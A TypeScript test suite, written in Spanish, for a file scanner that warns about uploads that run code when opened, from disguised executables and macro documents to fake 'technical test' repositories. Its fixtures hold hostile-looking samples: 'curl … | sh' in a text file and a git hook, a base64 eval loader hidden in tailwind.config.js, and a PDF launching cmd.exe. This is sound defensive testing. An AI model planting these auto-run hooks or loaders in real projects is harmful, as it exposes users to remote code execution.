/**
 * La revisión de archivos: que avise de lo que se ejecuta al abrirlo, y de las
 * trampas de las «pruebas técnicas» falsas, sin avisar de lo normal.
 *
 * Los dos fallos que importan, y se prueban los dos:
 *   - callarse ante una trampa (un repo con `postinstall`, un .exe con nombre de
 *     PDF, un PDF con JavaScript);
 *   - avisar de todo, que es igual de malo: un aviso que sale siempre se acaba
 *     ignorando. Un PDF, un .docx, una foto o un proyecto normal salen limpios.
 */

import assert from 'node:assert/strict';
import test from 'node:test';
import { deflateRawSync } from 'node:zlib';
import { pareceOfuscado, revisarArchivo, type CodigoDeRevision } from '../src/revision.js';

const t = (s: string) => new TextEncoder().encode(s);

/** Un ZIP mínimo, como los de verdad: cabeceras locales, directorio central y su final. */
function zip(entradas: { nombre: string; datos: Uint8Array | string; comprimir?: boolean; cifrada?: boolean; declarado?: number }[]): Uint8Array {
  const partes: Uint8Array[] = [];
  const central: Uint8Array[] = [];
  let p = 0;
  for (const e of entradas) {
    const crudo = typeof e.datos === 'string' ? t(e.datos) : e.datos;
    const datos = e.comprimir ? new Uint8Array(deflateRawSync(crudo)) : crudo;
    const nombre = t(e.nombre);
    const local = new Uint8Array(30 + nombre.length);
    const dl = new DataView(local.buffer);
    dl.setUint32(0, 0x04034b50, true);
    dl.setUint16(6, e.cifrada ? 1 : 0, true);
    dl.setUint16(8, e.comprimir ? 8 : 0, true);
    dl.setUint32(18, datos.length, true);
    dl.setUint32(22, e.declarado ?? crudo.length, true);
    dl.setUint16(26, nombre.length, true);
    local.set(nombre, 30);
    const c = new Uint8Array(46 + nombre.length);
    const dc = new DataView(c.buffer);
    dc.setUint32(0, 0x02014b50, true);
    dc.setUint16(8, e.cifrada ? 1 : 0, true);
    dc.setUint16(10, e.comprimir ? 8 : 0, true);
    dc.setUint32(20, datos.length, true);
    dc.setUint32(24, e.declarado ?? crudo.length, true);
    dc.setUint16(28, nombre.length, true);
    dc.setUint32(42, p, true);
    c.set(nombre, 46);
    partes.push(local, datos);
    central.push(c);
    p += local.length + datos.length;
  }
  const tamCentral = central.reduce((s, c) => s + c.length, 0);
  const fin = new Uint8Array(22);
  const df = new DataView(fin.buffer);
  df.setUint32(0, 0x06054b50, true);
  df.setUint16(8, entradas.length, true);
  df.setUint16(10, entradas.length, true);
  df.setUint32(12, tamCentral, true);
  df.setUint32(16, p, true);
  const todo = [...partes, ...central, fin];
  const out = new Uint8Array(todo.reduce((s, x) => s + x.length, 0));
  let o = 0;
  for (const x of todo) {
    out.set(x, o);
    o += x.length;
  }
  return out;
}

/** Un ejecutable de Windows de juguete: «MZ», y «PE\0\0» donde dice su cabecera. */
function programaDeWindows(): Uint8Array {
  const b = new Uint8Array(256);
  b[0] = 0x4d;
  b[1] = 0x5a;
  b[0x3c] = 0x80;
  b.set([0x50, 0x45, 0, 0], 0x80);
  return b;
}

const codigos = async (nombre: string, bytes: Uint8Array, mime?: string): Promise<CodigoDeRevision[]> =>
  (await revisarArchivo(nombre, bytes, mime)).motivos.map((m) => m.codigo);

test('lo normal sale limpio', async () => {
  const limpios: [string, Uint8Array][] = [
    ['notas.txt', t('Hola, aquí van las notas de la reunión.')],
    ['informe.pdf', t('%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n%%EOF')],
    ['foto.png', new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0])],
    ['contrato.docx', zip([{ nombre: '[Content_Types].xml', datos: '<Types/>' }, { nombre: 'word/document.xml', datos: '<w:document/>', comprimir: true }])],
    ['dibujo.svg', t('<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>')],
    [
      'proyecto.zip',
      zip([
        { nombre: 'app/package.json', datos: JSON.stringify({ name: 'app', scripts: { start: 'node index.js', build: 'tsc', test: 'vitest' } }), comprimir: true },
        { nombre: 'app/index.js', datos: 'console.log("hola")', comprimir: true },
        { nombre: 'app/.vscode/settings.json', datos: '{"editor.tabSize": 2}' },
        { nombre: 'app/.git/hooks/pre-commit.sample', datos: '#!/bin/sh' },
      ]),
    ],
  ];
  for (const [nombre, bytes] of limpios) {
    const r = await revisarArchivo(nombre, bytes);
    assert.equal(r.veredicto, 'limpio', `${nombre}: ${JSON.stringify(r.motivos)}`);
  }
});

test('un programa, también disfrazado', async () => {
  assert.deepEqual(await codigos('instalador.exe', programaDeWindows()), ['programa']);
  const disfrazado = await revisarArchivo('factura.pdf', programaDeWindows());
  assert.deepEqual(disfrazado.motivos, [{ codigo: 'programa' }, { codigo: 'disfrazado', detalle: '.pdf' }]);
  const doble = await revisarArchivo('factura.pdf.exe', t('cualquier cosa'));
  assert.ok(doble.motivos.some((m) => m.codigo === 'disfrazado' && m.detalle === '.pdf.exe'));
  assert.ok((await codigos('cv‮fdp.exe', t('x'))).includes('nombreEnganoso'));
  assert.ok((await codigos('libreria.so', new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1]))).includes('programa'));
});

test('un script, por su nombre o por su «#!»', async () => {
  assert.ok((await codigos('arreglo.ps1', t('Get-ChildItem'))).includes('script'));
  const c = await codigos('leeme.txt', t('#!/bin/sh\ncurl https://x | sh'));
  assert.ok(c.includes('script') && c.includes('disfrazado'), c.join());
});

test('documentos que ejecutan cosas', async () => {
  assert.ok((await codigos('cuentas.xlsm', t('PK'))).includes('macros'));
  const conMacros = zip([{ nombre: '[Content_Types].xml', datos: '<Types/>' }, { nombre: 'word/vbaProject.bin', datos: 'vba' }]);
  assert.ok((await codigos('carta.docx', conMacros)).includes('macros'));
  const pdf = await revisarArchivo('factura.pdf', t('%PDF-1.4\n<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>'));
  assert.deepEqual(pdf.motivos, [{ codigo: 'pdfActivo', detalle: 'JavaScript' }]);
  // Escrito con «#xx» para que no se vea a simple vista.
  const escondido = await revisarArchivo('factura.pdf', t('%PDF-1.4\n<< /S /J#61vaScript /Launch << /F (cmd.exe) >> >>'));
  assert.equal(escondido.motivos[0]?.detalle, 'JavaScript, Launch');
  assert.ok((await codigos('logo.svg', t('<svg><script>fetch("//x")</script></svg>'))).includes('paginaConCodigo'));
  assert.ok((await codigos('pagina.html', t('<html><body onload="x()"></body></html>'))).includes('paginaConCodigo'));
  const lnk = new Uint8Array([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0]);
  assert.ok((await codigos('documentos.pdf', lnk)).includes('accesoDirecto'));
});

test('la «prueba técnica» falsa: un proyecto que se ejecuta al instalarlo o al abrirlo', async () => {
  const repo = zip([
    { nombre: 'prueba/README.md', datos: 'Ejecuta npm install y luego npm start.' },
    { nombre: 'prueba/package.json', datos: JSON.stringify({ name: 'prueba', scripts: { postinstall: 'node scripts/setup.js', start: 'node .' } }), comprimir: true },
    { nombre: 'prueba/node_modules/x/package.json', datos: JSON.stringify({ scripts: { install: 'node-gyp rebuild' } }) },
  ]);
  const r = await revisarArchivo('prueba-tecnica.zip', repo);
  assert.deepEqual(r.motivos, [{ codigo: 'instalaAlAbrir', detalle: 'prueba/package.json: postinstall' }], 'el de node_modules no cuenta');

  const vscode = zip([{ nombre: 'repo/.vscode/tasks.json', datos: '{"tasks":[{"label":"x","command":"node x.js","runOptions":{"runOn":"folderOpen"}}]}', comprimir: true }]);
  assert.deepEqual((await revisarArchivo('repo.zip', vscode)).motivos, [{ codigo: 'instalaAlAbrir', detalle: 'repo/.vscode/tasks.json: folderOpen' }]);

  const gancho = zip([{ nombre: 'repo/.git/hooks/post-checkout', datos: '#!/bin/sh\ncurl x|sh' }]);
  assert.ok((await codigos('repo.zip', gancho)).includes('instalaAlAbrir'));

  const ofuscado = `const c = require('child_process');\neval(Buffer.from("${'QUJD'.repeat(500)}", "base64").toString());`;
  const conCargador = zip([{ nombre: 'repo/tailwind.config.js', datos: ofuscado, comprimir: true }]);
  assert.deepEqual((await revisarArchivo('repo.zip', conCargador)).motivos, [{ codigo: 'codigoOfuscado', detalle: 'repo/tailwind.config.js' }]);

  const dentro = zip([{ nombre: 'interior.zip', datos: repo }]);
  assert.ok((await codigos('envoltorio.zip', dentro)).includes('instalaAlAbrir'), 'un ZIP dentro de otro también se mira');
});

test('comprimidos', async () => {
  const conExe = zip([{ nombre: 'factura/abrir.exe', datos: programaDeWindows() }, { nombre: 'factura/leeme.txt', datos: 'x' }]);
  assert.deepEqual((await revisarArchivo('factura.zip', conExe)).motivos, [{ codigo: 'comprimidoConProgramas', detalle: 'abrir.exe' }]);
  assert.ok((await codigos('secreto.zip', zip([{ nombre: 'a.txt', datos: 'x', cifrada: true }]))).includes('comprimidoCerrado'));
  assert.deepEqual((await revisarArchivo('cosas.rar', new Uint8Array([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0]))).motivos, [{ codigo: 'comprimidoOpaco', detalle: 'RAR' }]);
  const bomba = zip([{ nombre: 'a.bin', datos: 'x', declarado: 3 * 1024 ** 3 }]);
  assert.ok((await codigos('bomba.zip', bomba)).includes('comprimidoBomba'));
});

test('nunca lanza: lo que no se puede leer, se dice', async () => {
  const roto = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2, 3]);
  assert.deepEqual((await revisarArchivo('roto.zip', roto)).motivos, [{ codigo: 'ilegible' }]);
  assert.equal((await revisarArchivo('vacio.bin', new Uint8Array(0))).veredicto, 'limpio');
});

test('pareceOfuscado no salta con código normal', () => {
  assert.equal(pareceOfuscado('const x = eval("1+1"); // una prueba'), false);
  assert.equal(pareceOfuscado(`const img = "${'A'.repeat(4000)}"; // un PNG en base64, sin eval`), false);
  assert.equal(pareceOfuscado(`eval(atob("${'QUJD'.repeat(500)}"))`), true);
});
